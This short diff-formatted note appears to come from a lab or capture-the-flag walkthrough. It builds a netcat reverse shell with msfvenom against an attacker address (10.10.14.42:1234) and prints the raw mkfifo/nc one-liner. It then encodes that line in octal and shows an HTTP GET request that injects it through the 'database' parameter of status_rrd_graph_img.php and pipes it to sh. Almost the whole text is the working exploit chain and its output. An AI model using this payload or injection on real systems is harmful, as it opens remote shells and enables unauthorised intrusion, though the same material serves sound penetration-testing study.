@@ -1,1 +1,14 @@
+hippoeug@kali:~$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.42 LPORT=1234
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 89 bytes
+mkfifo /tmp/nmxu; nc 10.10.14.42 1234 0</tmp/nmxu | /bin/sh >/tmp/nmxu 2>&1; rm /tmp/nmxu
 
+
+Website: Text to Octal
+
+\155 \153 \146 \151 \146 \157 \40 \57 \164 \155 \160 \57 \156 \155 \170 \165 \73 \40 \156 \143 \40 \61 \60 \56 \61 \60 \56 \61 \64 \56 \64 \62 \40 \61 \62 \63 \64 \40 \60 \74 \57 \164 \155 \160 \57 \156 \155 \170 \165 \40 \174 \40 \57 \142 \151 \156 \57 \163 \150 \40 \76 \57 \164 \155 \160 \57 \156 \155 \170 \165 \40 \62 \76 \46 \61 \73 \40 \162 \155 \40 \57 \164 \155 \160 \57 \156 \155 \170 \165
+
+
+GET /status_rrd_graph_img.php?database=queues;printf+'\155 \153 \146 \151 \146 \157 \40 \57 \164 \155 \160 \57 \156 \155 \170 \165 \73 \40 \156 \143 \40 \61 \60 \56 \61 \60 \56 \61 \64 \56 \64 \62 \40 \61 \62 \63 \64 \40 \60 \74 \57 \164 \155 \160 \57 \156 \155 \170 \165 \40 \174 \40 \57 \142 \151 \156 \57 \163 \150 \40 \76 \57 \164 \155 \160 \57 \156 \155 \170 \165 \40 \62 \76 \46 \61 \73 \40 \162 \155 \40 \57 \164 \155 \160 \57 \156 \155 \170 \165'|sh HTTP/1.1
